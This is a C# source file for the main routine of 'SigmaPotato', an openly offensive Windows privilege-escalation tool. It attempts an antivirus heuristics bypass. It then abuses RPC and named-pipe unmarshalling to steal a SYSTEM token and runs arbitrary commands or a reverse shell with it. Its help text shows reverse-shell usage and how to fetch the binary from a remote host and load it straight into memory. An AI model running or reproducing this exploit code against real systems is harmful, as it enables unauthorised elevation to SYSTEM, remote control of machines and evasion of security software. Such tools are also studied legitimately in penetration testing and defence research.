using System;
using System.IO;
using System.Reflection;
using System.Diagnostics;
using System.Security.Principal;
using SharpToken;
using NativeAPI;
using System.Runtime.InteropServices;


public class SigmaPotato
{
    public static void Main(string[] args)
    {

        // Rudimentary AV Heuristics Bypass by calling an Uncommon API
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hprocess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreffered);
        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if (mem == null)
        {
            return;
        }


        // Establish variables and assembly name
        TextWriter ConsoleWriter = Console.Out;
        Assembly assembly = Assembly.GetExecutingAssembly();
        AssemblyName assemblyName = assembly.GetName();
        string assemblyString = assemblyName.Name;
        string helpMessage = null;


        // Build Help Message
        string banner = @"
 ____  _                       ____       _        _                   
/ ___|(_) __ _ _ __ ___   __ _|  _ \ ___ | |_ __ _| |_ ___  
\___ \| |/ _` | '_ ` _ \ / _` | |_) / _ \| __/ _` | __/ _ \ 
 ___) | | (_| | | | | | | (_| |  __/ (_) | || (_| | || (_) |
|____/|_|\__, |_| |_| |_|\__,_|_|   \___/ \__\__,_|\__\___/ 
         |___/";

        string bannerCore = @"
 ____  _                       ____       _        _         |   ____               
/ ___|(_) __ _ _ __ ___   __ _|  _ \ ___ | |_ __ _| |_ ___   |  / ___|___  _ __ ___ 
\___ \| |/ _` | '_ ` _ \ / _` | |_) / _ \| __/ _` | __/ _ \  | | |   / _ \| '__/ _ \
 ___) | | (_| | | | | | | (_| |  __/ (_) | || (_| | || (_) | | | |__| (_) | | |  __/
|____/|_|\__, |_| |_| |_|\__,_|_|   \___/ \__\__,_|\__\___/  |  \____\___/|_|  \___|
         |___/                                               |";

        string helpBody = @"
Author: Tyler McCann (@tylerdotrar)
Arbitary Version Number: v1.2.6

.--------------------------------.
| Usage from Disk via the Binary |
'--------------------------------'
        
[+]  Command Execution : ./SigmaPotato.exe <command>
[+]  Reverse Shell     : ./SigmaPotato.exe --revshell <ip_addr> <port>
                

.---------------------------------------.
| Usage from Memory via .NET Reflection |
'---------------------------------------'

[+]  Load Locally      : [System.Reflection.Assembly]::LoadFile(""$PWD/SigmaPotato.exe"")
[+]  Load Remotely     : [System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData('http(s)://<ip_addr>/SigmaPotato.exe'))
---                    
[+]  Command Execution : [SigmaPotato]::Main('<command>')
[+]  Reverse Shell     : [SigmaPotato]::Main(@('--revshell','<ip_addr>','<port>'))
";


        // Detect AssemblyName and adjust help message accordingly.
        if (assemblyString == "SigmaPotatoCore")
        {
            helpMessage = bannerCore + Environment.NewLine + helpBody;
        }
        else
        {
            helpMessage = banner + Environment.NewLine + helpBody;
        }


        // General Error Correction
        if (args.Length == 0 || string.IsNullOrEmpty(args[0]))
        {
            ConsoleWriter.WriteLine("[-] No arguments detected.  Use '--help' for usage information.\n");
            return;
        }
        else if (args[0] != "--revshell" && args.Length > 1)
        {
            ConsoleWriter.WriteLine("[-] Unexpected arguments detected.  Use '--help' for usage information.");
            ConsoleWriter.WriteLine(" o  (Hint: you might need to wrap your arguments in quotations)\n");

            return;
        }
        else if (args[0] == "--revshell" && args.Length < 3)
        {
            ConsoleWriter.WriteLine("[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.");
            ConsoleWriter.WriteLine(" o  (Hint: you need to specify an IP address and port)\n");
            return;
        }


        // Return help message
        else if (args[0] == "--help")
        {
            ConsoleWriter.WriteLine(helpMessage);
            return;
        }


        // Establish input variables.
        string commandLine = args[0];
        string IpAddress = null;
        int Port = 0;


        if (commandLine == "--revshell")
        {
            if (args.Length < 3)
            {
                ConsoleWriter.WriteLine("[-] Reverse shell functionality is missing arguments.  Use '--help' for usage information.");
                ConsoleWriter.WriteLine(" o  (Hint: you need to specify an IP address and port)\n");
                return;
            }

            IpAddress = args[1];
            Port = int.Parse(args[2]);
        }

            
        // Start Esoteric Tomfoolery
        try
        {
            SigmaPotatoContext SigmaPotatoContext = new SigmaPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());
            SigmaPotatoContext.HookRPC();

            ConsoleWriter.WriteLine("[+] Starting Pipe Server...");
            SigmaPotatoContext.Start();

            SigmaPotatoUnmarshalTrigger unmarshalTrigger = new SigmaPotatoUnmarshalTrigger(SigmaPotatoContext);

            try
            {
                int hr = unmarshalTrigger.Trigger();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine(e);
            }
            

            // Attempt to execute command in an elevated security context
            WindowsIdentity systemIdentity = SigmaPotatoContext.GetToken();
            if (systemIdentity != null)
            {
                string ProcessOutput = null;

				TokenUtils.createProcessReadOut(out ProcessOutput, ConsoleWriter, systemIdentity.Token, commandLine, IpAddress, Port);

                // WIP: This isn't working with .NET Reflection; needs troubleshooting.
                //ConsoleWriter.WriteLine($"Exported Process Output: {ProcessOutput}");

                // Store process output in an environment variable that can be interacted with in PowerShell if using Reflection
                if (ProcessOutput != null)
                {
                    Environment.SetEnvironmentVariable("SigmaOutput", ProcessOutput); // Variable Name: $env:SigmaOutput
                }
                else
                {
                    Environment.SetEnvironmentVariable("SigmaOutput", "null"); // Variable Name: $env:SigmaOutput
                }
            }
            else
            {
                ConsoleWriter.WriteLine("[-] Failed to impersonate security context token.");
            }

            SigmaPotatoContext.Restore();
            SigmaPotatoContext.Stop();
        }
        catch (Exception e)
        {
            ConsoleWriter.WriteLine($"[-] Error! Exception: {e.Message}");
        }
    }
}
